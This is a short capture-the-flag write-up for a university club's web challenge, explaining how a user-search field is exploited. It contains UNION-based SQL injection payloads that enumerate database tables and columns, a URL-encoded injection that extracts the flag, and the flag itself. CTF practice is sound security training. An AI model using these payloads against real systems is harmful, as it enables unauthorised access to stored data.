# web / web2

> Points: 2357

## Question


> <https://ctf.csclub.uwaterloo.ca/web/3/>

## Solution

We are given an input field that allows us to query for users. On trying various inputs, we can see that it behaves like a SQL query which is of form `SELECT [some columns] FROM [some table] WHERE username LIKE '{user input}%'`.  
The query parameter is susceptible to a SQL Injection. After testing various inection payloads, we discover that we can exploit a 3-column UNION query for injection. Now we can use this to find out the table name and the column where the flag is stored.  
```
' UNION ALL SELECT NULL, table_name, NULL FROM information_schema.tables-- 

' UNION ALL SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='flag'-- 
```

With this information, we can finally get the flag.
```
https://ctf.csclub.uwaterloo.ca/web/3/?query=%27+UNION+ALL+SELECT+NULL%2C+flag%2C+NULL+FROM+flag--+
```


### Flag

`uwctf{f442df99a59d4e91}`